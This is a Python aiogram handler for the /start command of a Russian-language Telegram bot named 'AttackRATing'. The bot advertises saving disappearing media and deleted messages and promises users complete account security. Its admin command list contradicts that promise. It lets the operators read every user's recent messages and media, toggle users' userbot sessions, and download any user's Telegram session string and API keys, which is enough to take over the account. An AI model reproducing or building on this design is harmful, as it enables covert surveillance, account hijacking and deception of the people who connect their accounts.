"""Команда /start."""
from __future__ import annotations

from aiogram import Router
from aiogram.filters import Command
from aiogram.types import (
    FSInputFile,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
    WebAppInfo,
)

from bot.config import INSTRUCTION_IMAGE, MINI_APP_URL
from bot.db import add_referral, get_referral_count, get_userbot_session, is_admin
from bot.loader import bot
from bot.utils import esc

router = Router(name="start")


def _optional_userbot_keyboard() -> InlineKeyboardMarkup:
    """Кнопки предложения подключить «передумал писать» (необязательно)."""
    rows: list[list[InlineKeyboardButton]] = []
    if MINI_APP_URL and MINI_APP_URL.startswith("http"):
        rows.append([
            InlineKeyboardButton(
                text="🚀 Подключить «передумал писать»",
                web_app=WebAppInfo(url=MINI_APP_URL),
            )
        ])
    rows.append([
        InlineKeyboardButton(
            text="📖 Как подключить",
            callback_data="userbot_howto",
        ),
        InlineKeyboardButton(
            text="⏭ Позже",
            callback_data="userbot_later",
        ),
    ])
    return InlineKeyboardMarkup(inline_keyboard=rows)


@router.message(Command("start"))
async def cmd_start(message: Message):
    user = message.from_user

    args = message.text.split()
    if len(args) > 1 and args[1].startswith("ref_"):
        try:
            inviter_id = int(args[1][4:])
            if add_referral(inviter_id, user.id):
                try:
                    inviter_count = get_referral_count(inviter_id)
                    await bot.send_message(
                        inviter_id,
                        f"👥 <b>По вашей реферальной ссылке зарегистрировался новый пользователь!</b>\n"
                        f"👤 {esc(user.full_name)}\n"
                        f"📊 Всего приглашено: <b>{inviter_count}</b>",
                    )
                except Exception:
                    pass
        except (ValueError, IndexError):
            pass

    await message.answer_photo(
        FSInputFile(INSTRUCTION_IMAGE),
        caption=(
            "👋 Добро пожаловать.\n\n"
            "🕵️ <b>AttackRATing</b> — позволит тебе все что можно и нельзя. "
            "С гарантией на полную безопасность и конфиденциальность аккаунта.\n\n"
            "Коротко о функционале:\n"
            "<blockquote> • Сохранять одноразовые видео/фото/кружки и голосовые\n"
            "• Сохранять видео/фото с таймером\n"
            "• Сохранять удалённые и отредактированные сообщения\n"
            "• Команды бота /help </blockquote>\n\n"
            "Инструкция по подключению — на картинке выше 👆"
        ),
    )

    # Необязательное предложение подключить userbot («передумал писать»)
    row = get_userbot_session(user.id)
    has_active = bool(row and row[0] and row[0] != "pending" and row[3])
    if not has_active:
        await message.answer(
            "🖋 <b>«Передумал писать»</b> — опционально\n\n"
            "Бот может уведомлять, когда собеседник начал печатать и передумал "
            "(закрыл чат / стёр текст).\n\n"
            "Для этого нужен userbot — подключение <b>необязательно</b>. "
            "Без него основной функционал (business) работает как обычно.\n\n"
            "Подключить сейчас или позже через /userbot.",
            reply_markup=_optional_userbot_keyboard(),
        )

    if is_admin(user.id):
        await message.answer(
            "🔧 <b>Доступные команды администратора:</b>\n\n"
            "• /helpadmin — полный список команд\n"
            "• /users — список всех пользователей\n"
            "• /stats — статистика бота\n"
            "• /admins — список админов\n"
            "• /events — последние события\n"
            "• /lastmessages — последние 50 сообщений всех\n"
            "• /lastmessages 100 — последние 100 сообщений всех (макс. 300)\n"
            "• /lastmessages 123456789 — последние 50 сообщений пользователя\n"
            "• /lastmessages 123456789 100 — последние 100 сообщений пользователя\n"
            "• /ubsessions — список всех сессий\n"
            "• /ubon ID — включить сессию пользователя\n"
            "• /uboff ID — выключить сессию\n"
            "• /ubget ID — скачать session_string + api (файл)\n"
            "• /ubdel ID — удалить сессию\n"
            "• /lastmedia [кол-во] — последние медиафайлы\n"
            "• /addadmin ID — добавить админа (только Owner)\n"
            "• /removeadmin ID — убрать админа (только Owner)\n"
            "• /broadcast — рассылка сообщения"
        )


@router.callback_query(lambda c: c.data == "userbot_later")
async def callback_userbot_later(callback):
    await callback.answer()
    try:
        await callback.message.edit_text(
            "👌 Ок. Когда захочешь — /userbot\n"
            "Основной функционал бота уже доступен без userbot."
        )
    except Exception:
        await callback.message.answer(
            "👌 Ок. Когда захочешь — /userbot\n"
            "Основной функционал бота уже доступен без userbot."
        )
